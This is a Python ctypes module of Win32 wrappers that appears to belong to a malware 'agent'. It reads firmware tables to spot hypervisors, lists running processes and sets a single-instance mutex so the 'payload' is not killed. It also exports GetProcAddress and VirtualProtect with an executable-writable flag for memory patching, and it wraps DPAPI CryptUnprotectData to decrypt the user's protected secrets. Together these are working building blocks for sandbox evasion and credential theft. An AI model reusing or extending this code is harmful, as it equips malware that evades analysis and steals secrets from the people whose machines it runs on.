"""Win32 surface for the agent.

Every entry point here is declared in SIGNATURES.md with its argtypes, restype and
failure mode. Two rules hold without exception: no wrapper returns a raw error code,
and every wrapper returns a typed value or ``None``.

On a non-Windows platform the module still imports and every wrapper is a no-op.
That is what lets the test suite import the whole tree on Linux without a Windows
branch leaking into the collectors.

``ctypes.windll`` is banned across this project. It implies ``use_last_error=False``,
which makes ``ctypes.get_last_error()`` return 0 forever and silently turns the
mutex guard into a no-op.
"""

from __future__ import annotations

import ctypes
import sys
from collections.abc import Iterator
from ctypes import wintypes
from typing import Final, NamedTuple

from . import log

_WINDOWS: Final[bool] = sys.platform == "win32"

# --- error and flag constants -------------------------------------------------

ERROR_SUCCESS: Final[int] = 0
ERROR_FILE_NOT_FOUND: Final[int] = 2
ERROR_PATH_NOT_FOUND: Final[int] = 3
ERROR_INVALID_HANDLE: Final[int] = 6
ERROR_INVALID_DATA: Final[int] = 13
ERROR_NO_MORE_FILES: Final[int] = 18
ERROR_INVALID_PARAMETER: Final[int] = 87
ERROR_BUFFER_OVERFLOW: Final[int] = 111
ERROR_INSUFFICIENT_BUFFER: Final[int] = 122
ERROR_MOD_NOT_FOUND: Final[int] = 126
ERROR_PROC_NOT_FOUND: Final[int] = 127
ERROR_ALREADY_EXISTS: Final[int] = 183
ERROR_NO_DATA: Final[int] = 232
ERROR_MORE_DATA: Final[int] = 234

KEY_READ: Final[int] = 0x20019
HKEY_LOCAL_MACHINE: Final[int] = 0x80000002
HKEY_CURRENT_USER: Final[int] = 0x80000001

REG_SZ: Final[int] = 1
REG_EXPAND_SZ: Final[int] = 2
REG_BINARY: Final[int] = 3
REG_DWORD: Final[int] = 4

TH32CS_SNAPPROCESS: Final[int] = 0x00000002

AF_UNSPEC: Final[int] = 0
GAA_FLAG_SKIP_ANYCAST: Final[int] = 0x0002
GAA_FLAG_SKIP_MULTICAST: Final[int] = 0x0004
GAA_FLAG_SKIP_DNS_SERVER: Final[int] = 0x0008

IF_TYPE_SOFTWARE_LOOPBACK: Final[int] = 24

PAGE_READWRITE: Final[int] = 0x04
PAGE_EXECUTE_READWRITE: Final[int] = 0x40

_MONITORINFOF_PRIMARY: Final[int] = 0x00000001
_MAX_FIRMWARE_BYTES: Final[int] = 16 * 1024 * 1024
_MAX_ADAPTERS: Final[int] = 64
_MAX_PROCESSES: Final[int] = 4096
_MAX_SMBIOS_STRUCTURES: Final[int] = 4096
_MAX_ACPI_TABLE_BYTES: Final[int] = 4096

_INVALID_HANDLE: Final[int | None] = ctypes.c_void_p(-1).value


# --- structures ---------------------------------------------------------------


class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char)),
    ]


class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ("dwLength", wintypes.DWORD),
        ("dwMemoryLoad", wintypes.DWORD),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [
        ("wProcessorArchitecture", wintypes.WORD),
        ("wReserved", wintypes.WORD),
        ("dwPageSize", wintypes.DWORD),
        ("lpMinimumApplicationAddress", wintypes.LPVOID),
        ("lpMaximumApplicationAddress", wintypes.LPVOID),
        ("dwActiveProcessorMask", ctypes.c_size_t),
        ("dwNumberOfProcessors", wintypes.DWORD),
        ("dwProcessorType", wintypes.DWORD),
        ("dwAllocationGranularity", wintypes.DWORD),
        ("wProcessorLevel", wintypes.WORD),
        ("wProcessorRevision", wintypes.WORD),
    ]


class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_size_t),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


class MONITORINFOEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("rcMonitor", RECT),
        ("rcWork", RECT),
        ("dwFlags", wintypes.DWORD),
        ("szDevice", wintypes.WCHAR * 32),
    ]


class SOCKADDR(ctypes.Structure):
    _fields_ = [
        ("sa_family", wintypes.USHORT),
        ("sa_data", ctypes.c_char * 14),
    ]


class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
    pass


class IP_ADAPTER_ADDRESSES(ctypes.Structure):
    pass


IP_ADAPTER_UNICAST_ADDRESS._fields_ = [
    ("Length", wintypes.ULONG),
    ("Flags", wintypes.DWORD),
    ("Next", ctypes.POINTER(IP_ADAPTER_UNICAST_ADDRESS)),
    ("Address", SOCKADDR),
]

# Only the members up to OperStatus are read; the struct is walked by pointer and
# never constructed, so the trailing members are left out on purpose.
IP_ADAPTER_ADDRESSES._fields_ = [
    ("Length", wintypes.ULONG),
    ("IfIndex", wintypes.DWORD),
    ("Next", ctypes.POINTER(IP_ADAPTER_ADDRESSES)),
    ("AdapterName", ctypes.c_char_p),
    ("FirstUnicastAddress", ctypes.POINTER(IP_ADAPTER_UNICAST_ADDRESS)),
    ("FirstAnycastAddress", ctypes.c_void_p),
    ("FirstMulticastAddress", ctypes.c_void_p),
    ("FirstDnsServerAddress", ctypes.c_void_p),
    ("DnsSuffix", wintypes.LPWSTR),
    ("Description", wintypes.LPWSTR),
    ("FriendlyName", wintypes.LPWSTR),
    ("PhysicalAddress", ctypes.c_ubyte * 8),
    ("PhysicalAddressLength", wintypes.ULONG),
    ("Flags", wintypes.ULONG),
    ("Mtu", wintypes.ULONG),
    ("IfType", wintypes.ULONG),
    ("OperStatus", wintypes.ULONG),
]


_WINFUNCTYPE = getattr(ctypes, "WINFUNCTYPE", ctypes.CFUNCTYPE)

MONITORENUMPROC = _WINFUNCTYPE(
    wintypes.BOOL,
    wintypes.HANDLE,
    wintypes.HDC,
    ctypes.POINTER(RECT),
    wintypes.LPARAM,
)


# --- library handles ----------------------------------------------------------

if _WINDOWS:
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    _user32 = ctypes.WinDLL("user32", use_last_error=True)
    _iphlpapi = ctypes.WinDLL("iphlpapi", use_last_error=True)
    _crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
else:  # pragma: no cover - exercised by the Linux import test
    _k32 = None
    _advapi32 = None
    _user32 = None
    _iphlpapi = None
    _crypt32 = None


def _declare() -> None:
    """Pin every prototype once. Nothing here relies on ctypes' default c_int."""
    _k32.GetSystemFirmwareTable.argtypes = [
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
    ]
    _k32.GetSystemFirmwareTable.restype = wintypes.UINT

    _k32.EnumSystemFirmwareTables.argtypes = [wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD]
    _k32.EnumSystemFirmwareTables.restype = wintypes.UINT

    _advapi32.RegOpenKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HKEY),
    ]
    _advapi32.RegOpenKeyExW.restype = wintypes.LONG

    _advapi32.RegQueryValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.DWORD),
        ctypes.POINTER(ctypes.c_ubyte),
        ctypes.POINTER(wintypes.DWORD),
    ]
    _advapi32.RegQueryValueExW.restype = wintypes.LONG

    _advapi32.RegCloseKey.argtypes = [wintypes.HKEY]
    _advapi32.RegCloseKey.restype = wintypes.LONG

    _iphlpapi.GetAdaptersAddresses.argtypes = [
        wintypes.ULONG,
        wintypes.ULONG,
        wintypes.LPVOID,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.ULONG),
    ]
    _iphlpapi.GetAdaptersAddresses.restype = wintypes.ULONG

    _k32.GlobalMemoryStatusEx.argtypes = [ctypes.POINTER(MEMORYSTATUSEX)]
    _k32.GlobalMemoryStatusEx.restype = wintypes.BOOL

    _user32.EnumDisplayMonitors.argtypes = [
        wintypes.HDC,
        ctypes.POINTER(RECT),
        MONITORENUMPROC,
        wintypes.LPARAM,
    ]
    _user32.EnumDisplayMonitors.restype = wintypes.BOOL

    _user32.GetMonitorInfoW.argtypes = [wintypes.HANDLE, ctypes.POINTER(MONITORINFOEXW)]
    _user32.GetMonitorInfoW.restype = wintypes.BOOL

    _k32.GetTickCount64.argtypes = []
    _k32.GetTickCount64.restype = ctypes.c_ulonglong

    _k32.GetNativeSystemInfo.argtypes = [ctypes.POINTER(SYSTEM_INFO)]
    _k32.GetNativeSystemInfo.restype = None

    _k32.GetDiskFreeSpaceExW.argtypes = [
        wintypes.LPCWSTR,
        ctypes.POINTER(ctypes.c_ulonglong),
        ctypes.POINTER(ctypes.c_ulonglong),
        ctypes.POINTER(ctypes.c_ulonglong),
    ]
    _k32.GetDiskFreeSpaceExW.restype = wintypes.BOOL

    # advapi32, not kernel32: the export moved out of kernel32 long ago and binding
    # it to the wrong module fails at import time, not at call time.
    _advapi32.GetUserNameW.argtypes = [wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD)]
    _advapi32.GetUserNameW.restype = wintypes.BOOL

    _k32.CreateMutexW.argtypes = [wintypes.LPVOID, wintypes.BOOL, wintypes.LPCWSTR]
    _k32.CreateMutexW.restype = ctypes.c_void_p

    _k32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    _k32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

    _k32.Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    _k32.Process32FirstW.restype = wintypes.BOOL

    _k32.Process32NextW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    _k32.Process32NextW.restype = wintypes.BOOL

    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype = wintypes.BOOL

    _k32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    _k32.GetModuleHandleW.restype = wintypes.HMODULE

    _k32.LoadLibraryW.argtypes = [wintypes.LPCWSTR]
    _k32.LoadLibraryW.restype = wintypes.HMODULE

    _k32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    _k32.GetProcAddress.restype = ctypes.c_void_p

    _k32.LocalFree.argtypes = [wintypes.HLOCAL]
    _k32.LocalFree.restype = wintypes.HLOCAL

    _k32.VirtualProtect.argtypes = [
        wintypes.LPVOID,
        ctypes.c_size_t,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    _k32.VirtualProtect.restype = wintypes.BOOL

    _crypt32.CryptUnprotectData.argtypes = [
        ctypes.POINTER(DATA_BLOB),
        ctypes.POINTER(wintypes.LPWSTR),
        ctypes.POINTER(DATA_BLOB),
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(DATA_BLOB),
    ]
    _crypt32.CryptUnprotectData.restype = wintypes.BOOL


if _WINDOWS:
    _declare()


# --- result types -------------------------------------------------------------


class AdapterInfo(NamedTuple):
    friendly_name: str
    description: str
    mac: str | None
    if_index: int
    if_type: int
    oper_status: int


class MemoryStatus(NamedTuple):
    total_phys: int
    avail_phys: int
    load_percent: int


class MonitorInfo(NamedTuple):
    left: int
    top: int
    right: int
    bottom: int
    device: str
    primary: bool


class SystemInfo(NamedTuple):
    processors: int
    page_size: int
    architecture: int


# --- firmware tables ----------------------------------------------------------


def _signature(provider: bytes) -> int:
    if len(provider) != 4:
        raise ValueError("firmware provider signature must be exactly 4 bytes")
    return int.from_bytes(provider, "little")


def firmware_table(provider: bytes, table_id: int = 0) -> bytes | None:
    """Raw firmware table bytes, or None. The size probe's 122 is not a failure."""
    if not _WINDOWS:
        return None
    signature = _signature(provider)
    size = int(_k32.GetSystemFirmwareTable(signature, table_id, None, 0))
    if size <= 0 or size > _MAX_FIRMWARE_BYTES:
        log.logger.debug("firmware %r/%#x: size probe returned %d", provider, table_id, size)
        return None
    buffer = ctypes.create_string_buffer(size)
    written = int(_k32.GetSystemFirmwareTable(signature, table_id, buffer, size))
    if written <= 0 or written > size:
        log.logger.debug("firmware %r/%#x: read returned %d", provider, table_id, written)
        return None
    return buffer.raw[:written]


def enum_firmware_tables(provider: bytes) -> tuple[bytes, ...]:
    """Four-byte signatures of the tables the firmware exposes for this provider."""
    if not _WINDOWS:
        return ()
    signature = _signature(provider)
    size = int(_k32.EnumSystemFirmwareTables(signature, None, 0))
    if size <= 0 or size % 4 != 0 or size > _MAX_FIRMWARE_BYTES:
        return ()
    buffer = ctypes.create_string_buffer(size)
    written = int(_k32.EnumSystemFirmwareTables(signature, buffer, size))
    if written <= 0 or written % 4 != 0 or written > size:
        return ()
    raw = buffer.raw[:written]
    return tuple(raw[index:index + 4] for index in range(0, written, 4))


def _smbios_structures(table: bytes) -> Iterator[tuple[int, bytes, list[str]]]:
    """Walk the SMBIOS structure table: (type, formatted area, string set)."""
    offset = 0
    limit = len(table)
    seen = 0
    while offset + 4 <= limit and seen < _MAX_SMBIOS_STRUCTURES:
        seen += 1
        structure_type = table[offset]
        length = table[offset + 1]
        if length < 4 or offset + length > limit:
            return
        formatted = table[offset:offset + length]

        strings: list[str] = []
        position = offset + length
        while position < limit:
            end = table.find(b"\x00", position)
            if end < 0:
                position = limit
                break
            if end == position:
                position = end + 1
                break
            strings.append(table[position:end].decode("utf-8", "replace"))
            position = end + 1

        yield structure_type, formatted, strings
        offset = position


def _smbios_string(strings: list[str], index: int) -> str:
    if index == 0 or index > len(strings):
        return ""
    return strings[index - 1]


def _format_uuid(raw: bytes) -> str:
    """SMBIOS stores the first three fields little-endian, the last two big-endian."""
    if len(raw) != 16 or not any(raw):
        return ""
    head = raw[0:4][::-1] + raw[4:6][::-1] + raw[6:8][::-1]
    text = head.hex() + raw[8:16].hex()
    return f"{text[0:8]}-{text[8:12]}-{text[12:16]}-{text[16:20]}-{text[20:32]}".upper()


def smbios_type1() -> dict[str, str] | None:
    """System Information (type 1): manufacturer, product, version, serial, uuid."""
    raw = firmware_table(b"RSMB", 0)
    if raw is None or len(raw) < 8:
        return None
    # The API is meant to guarantee the magic. If it ever does not, [4:8] is a
    # length parsed out of unrelated bytes and the walk runs off the table.
    if raw[:4] != b"RSMB":
        log.logger.debug("smbios: raw table magic %r", raw[:4])
        return None
    length = int.from_bytes(raw[4:8], "little")
    if length <= 0 or 8 + length > len(raw):
        return None
    table = raw[8:8 + length]
    for structure_type, formatted, strings in _smbios_structures(table):
        if structure_type != 1 or len(formatted) < 0x19:
            continue
        return {
            "manufacturer": _smbios_string(strings, formatted[0x04]),
            "product": _smbios_string(strings, formatted[0x05]),
            "version": _smbios_string(strings, formatted[0x06]),
            "serial": _smbios_string(strings, formatted[0x07]),
            "uuid": _format_uuid(formatted[0x08:0x18]),
        }
    return None


def _printable_runs(raw: bytes, minimum: int = 4, limit: int = 256) -> list[str]:
    runs: list[str] = []
    current: list[int] = []
    for byte in raw:
        if 0x20 <= byte < 0x7F:
            current.append(byte)
            continue
        if len(current) >= minimum:
            runs.append(bytes(current).decode("ascii"))
            if len(runs) >= limit:
                return runs
        current = []
    if len(current) >= minimum and len(runs) < limit:
        runs.append(bytes(current).decode("ascii"))
    return runs


def acpi_vendor_strings() -> tuple[str, ...]:
    """OEM identifiers from every ACPI table the firmware exposes.

    Windows does not always hand out the DSDT itself, so the header fields and the
    printable runs at the head of each table are collected and the gate tests them
    for the hypervisor vendor names.
    """
    if not _WINDOWS:
        return ()
    found: list[str] = []
    for signature in enum_firmware_tables(b"ACPI"):
        raw = firmware_table(b"ACPI", int.from_bytes(signature, "little"))
        if raw is None or len(raw) < 0x24:
            continue
        for start, length in ((0x10, 6), (0x18, 8)):
            text = raw[start:start + length].decode("ascii", "replace").strip("\x00 ")
            if text:
                found.append(text)
        found.extend(_printable_runs(raw[:_MAX_ACPI_TABLE_BYTES]))
    # Deduplicate while keeping the order stable so logs read the same twice.
    seen: set[str] = set()
    unique: list[str] = []
    for item in found:
        if item in seen:
            continue
        seen.add(item)
        unique.append(item)
    return tuple(unique)


# --- registry -----------------------------------------------------------------


def _open_key(root: int, subkey: str) -> wintypes.HKEY | None:
    if not _WINDOWS:
        return None
    handle = wintypes.HKEY()
    status = int(_advapi32.RegOpenKeyExW(wintypes.HKEY(root), subkey, 0, KEY_READ, ctypes.byref(handle)))
    if status != ERROR_SUCCESS:
        log.logger.debug("RegOpenKeyExW %s -> %d", subkey, status)
        return None
    return handle


def registry_key_exists(root: int, subkey: str) -> bool:
    handle = _open_key(root, subkey)
    if handle is None:
        return False
    _advapi32.RegCloseKey(handle)
    return True


def registry_value(root: int, subkey: str, name: str) -> str | int | bytes | None:
    """Decoded value, or None. Strings are stripped of the trailing NUL."""
    handle = _open_key(root, subkey)
    if handle is None:
        return None
    try:
        value_type = wintypes.DWORD()
        size = wintypes.DWORD()
        status = int(
            _advapi32.RegQueryValueExW(
                handle, name, None, ctypes.byref(value_type), None, ctypes.byref(size)
            )
        )
        if status != ERROR_SUCCESS or size.value == 0:
            log.logger.debug("RegQueryValueExW %s\\%s size -> %d", subkey, name, status)
            return None
        buffer = (ctypes.c_ubyte * size.value)()
        status = int(
            _advapi32.RegQueryValueExW(
                handle, name, None, ctypes.byref(value_type), buffer, ctypes.byref(size)
            )
        )
        if status != ERROR_SUCCESS:
            log.logger.debug("RegQueryValueExW %s\\%s -> %d", subkey, name, status)
            return None
        raw = bytes(buffer[:size.value])
    finally:
        _advapi32.RegCloseKey(handle)

    if value_type.value in (REG_SZ, REG_EXPAND_SZ):
        return raw.decode("utf-16-le", "replace").rstrip("\x00")
    if value_type.value == REG_DWORD and len(raw) >= 4:
        return int.from_bytes(raw[:4], "little")
    return raw


# --- adapters -----------------------------------------------------------------


def _walk_adapters(buffer: ctypes.Array[ctypes.c_char]) -> list[AdapterInfo]:
    found: list[AdapterInfo] = []
    current = ctypes.cast(buffer, ctypes.POINTER(IP_ADAPTER_ADDRESSES))
    count = 0
    while bool(current) and count < _MAX_ADAPTERS:
        entry = current.contents
        length = int(entry.PhysicalAddressLength)
        mac: str | None = None
        if 0 < length <= 8:
            mac = ":".join(f"{entry.PhysicalAddress[index]:02X}" for index in range(length))
        found.append(
            AdapterInfo(
                friendly_name=entry.FriendlyName or "",
                description=entry.Description or "",
                mac=mac,
                if_index=int(entry.IfIndex),
                if_type=int(entry.IfType),
                oper_status=int(entry.OperStatus),
            )
        )
        current = entry.Next
        count += 1
    return found


def adapters() -> list[AdapterInfo]:
    if not _WINDOWS:
        return []
    flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER
    size = wintypes.ULONG(16 * 1024)
    for _ in range(3):
        buffer = ctypes.create_string_buffer(size.value)
        result = int(
            _iphlpapi.GetAdaptersAddresses(
                AF_UNSPEC, flags, None, buffer, ctypes.byref(size)
            )
        )
        if result == ERROR_BUFFER_OVERFLOW:
            continue
        if result != ERROR_SUCCESS:
            log.logger.debug("GetAdaptersAddresses -> %d", result)
            return []
        return _walk_adapters(buffer)
    return []


def first_physical_mac() -> str | None:
    """First non-loopback adapter with a real hardware address."""
    for adapter in adapters():
        if adapter.if_type == IF_TYPE_SOFTWARE_LOOPBACK:
            continue
        if adapter.mac is None:
            continue
        if not adapter.mac.strip("0:"):
            continue
        return adapter.mac
    return None


# --- memory, displays, uptime, disk, identity ---------------------------------


def memory_status() -> MemoryStatus | None:
    if not _WINDOWS:
        return None
    status = MEMORYSTATUSEX()
    status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if not _k32.GlobalMemoryStatusEx(ctypes.byref(status)):
        log.logger.debug("GlobalMemoryStatusEx -> %d", ctypes.get_last_error())
        return None
    return MemoryStatus(
        total_phys=int(status.ullTotalPhys),
        avail_phys=int(status.ullAvailPhys),
        load_percent=int(status.dwMemoryLoad),
    )


def monitors() -> list[MonitorInfo]:
    if not _WINDOWS:
        return []
    found: list[MonitorInfo] = []

    def callback(
        hmonitor: int,
        hdc: int,
        rect: ctypes.POINTER(RECT),
        data: int,
    ) -> bool:
        info = MONITORINFOEXW()
        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
        if not _user32.GetMonitorInfoW(hmonitor, ctypes.byref(info)):
            return True
        found.append(
            MonitorInfo(
                left=int(info.rcMonitor.left),
                top=int(info.rcMonitor.top),
                right=int(info.rcMonitor.right),
                bottom=int(info.rcMonitor.bottom),
                device=str(info.szDevice),
                primary=bool(info.dwFlags & _MONITORINFOF_PRIMARY),
            )
        )
        return True

    procedure = MONITORENUMPROC(callback)
    _user32.EnumDisplayMonitors(None, None, procedure, 0)
    return found


def uptime_ms() -> int | None:
    if not _WINDOWS:
        return None
    return int(_k32.GetTickCount64())


def native_system_info() -> SystemInfo | None:
    if not _WINDOWS:
        return None
    info = SYSTEM_INFO()
    _k32.GetNativeSystemInfo(ctypes.byref(info))
    return SystemInfo(
        processors=int(info.dwNumberOfProcessors),
        page_size=int(info.dwPageSize),
        architecture=int(info.wProcessorArchitecture),
    )


def disk_total_bytes(path: str) -> int | None:
    if not _WINDOWS:
        return None
    free = ctypes.c_ulonglong(0)
    total = ctypes.c_ulonglong(0)
    available = ctypes.c_ulonglong(0)
    if not _k32.GetDiskFreeSpaceExW(
        path, ctypes.byref(free), ctypes.byref(total), ctypes.byref(available)
    ):
        log.logger.debug("GetDiskFreeSpaceExW %s -> %d", path, ctypes.get_last_error())
        return None
    return int(total.value)


def user_name() -> str | None:
    if not _WINDOWS:
        return None
    capacity = 257
    buffer = ctypes.create_unicode_buffer(capacity)
    size = wintypes.DWORD(capacity)
    if not _advapi32.GetUserNameW(buffer, ctypes.byref(size)):
        log.logger.debug("GetUserNameW -> %d", ctypes.get_last_error())
        return None
    return buffer.value


# --- mutex --------------------------------------------------------------------


def create_mutex(name: str) -> tuple[int | None, bool]:
    """(handle, created). ``created`` is False when another instance holds it.

    A NULL handle is not fatal: the guard is missing, the run continues, and the
    fact is logged. Exiting here would kill the payload for a benign reason.
    """
    if not _WINDOWS:
        return None, True
    handle = _k32.CreateMutexW(None, False, name)
    error = ctypes.get_last_error()
    if not handle:
        log.logger.warning("CreateMutexW failed (%d); continuing without the guard", error)
        return None, True
    return int(handle), error != ERROR_ALREADY_EXISTS


# --- processes ----------------------------------------------------------------


def process_names() -> frozenset[str]:
    """Lowercased image names of running processes, capped and always closed."""
    if not _WINDOWS:
        return frozenset()
    snapshot = _k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot is None or snapshot == _INVALID_HANDLE:
        log.logger.debug("CreateToolhelp32Snapshot -> %d", ctypes.get_last_error())
        return frozenset()
    names: set[str] = set()
    try:
        entry = PROCESSENTRY32W()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        if not _k32.Process32FirstW(snapshot, ctypes.byref(entry)):
            return frozenset()
        count = 0
        while count < _MAX_PROCESSES:
            names.add(entry.szExeFile.lower())
            count += 1
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not _k32.Process32NextW(snapshot, ctypes.byref(entry)):
                break
    finally:
        _k32.CloseHandle(snapshot)
    return frozenset(names)


# --- modules and addresses ----------------------------------------------------


def module_handle(name: str | None = None) -> int | None:
    if not _WINDOWS:
        return None
    handle = _k32.GetModuleHandleW(name)
    if not handle:
        log.logger.debug("GetModuleHandleW %s -> %d", name, ctypes.get_last_error())
        return None
    return int(handle)


def load_library(name: str) -> int | None:
    if not _WINDOWS:
        return None
    handle = _k32.LoadLibraryW(name)
    if not handle:
        log.logger.debug("LoadLibraryW %s -> %d", name, ctypes.get_last_error())
        return None
    return int(handle)


def proc_address(module: int, name: str) -> int | None:
    """Resolved address, or None. The c_void_p restype is what keeps this honest."""
    if not _WINDOWS:
        return None
    address = _k32.GetProcAddress(wintypes.HMODULE(module), name.encode("ascii"))
    if not address:
        log.logger.debug("GetProcAddress %s -> %d", name, ctypes.get_last_error())
        return None
    return int(address)


# --- memory protection --------------------------------------------------------


def virtual_protect(address: int, size: int, new_protect: int) -> int | None:
    """Previous protection, or None. Callers must restore it."""
    if not _WINDOWS:
        return None
    previous = wintypes.DWORD(0)
    if not _k32.VirtualProtect(
        ctypes.c_void_p(address), ctypes.c_size_t(size), new_protect, ctypes.byref(previous)
    ):
        log.logger.debug(
            "VirtualProtect %#x+%d -> %d", address, size, ctypes.get_last_error()
        )
        return None
    return int(previous.value)


# --- DPAPI --------------------------------------------------------------------


def crypt_unprotect(blob: bytes) -> bytes | None:
    """In-process DPAPI unwrap under the current user, or None."""
    if not _WINDOWS:
        return None
    if not blob:
        return None
    # The input buffer is kept referenced for the whole call; letting a temporary
    # die here hands CryptUnprotectData a dangling pointer.
    buffer = ctypes.create_string_buffer(blob, len(blob))
    data_in = DATA_BLOB(len(blob), ctypes.cast(buffer, ctypes.POINTER(ctypes.c_char)))
    data_out = DATA_BLOB()
    ok = _crypt32.CryptUnprotectData(
        ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)
    )
    if not ok:
        log.logger.debug("CryptUnprotectData -> %d", ctypes.get_last_error())
        return None
    try:
        return ctypes.string_at(data_out.pbData, data_out.cbData)
    finally:
        _k32.LocalFree(ctypes.cast(data_out.pbData, wintypes.HLOCAL))


__all__ = [
    "HKEY_CURRENT_USER",
    "HKEY_LOCAL_MACHINE",
    "PAGE_EXECUTE_READWRITE",
    "PAGE_READWRITE",
    "AdapterInfo",
    "MemoryStatus",
    "MonitorInfo",
    "SystemInfo",
    "acpi_vendor_strings",
    "adapters",
    "create_mutex",
    "crypt_unprotect",
    "disk_total_bytes",
    "enum_firmware_tables",
    "firmware_table",
    "first_physical_mac",
    "load_library",
    "memory_status",
    "module_handle",
    "monitors",
    "native_system_info",
    "proc_address",
    "process_names",
    "registry_key_exists",
    "registry_value",
    "smbios_type1",
    "uptime_ms",
    "user_name",
    "virtual_protect",
]
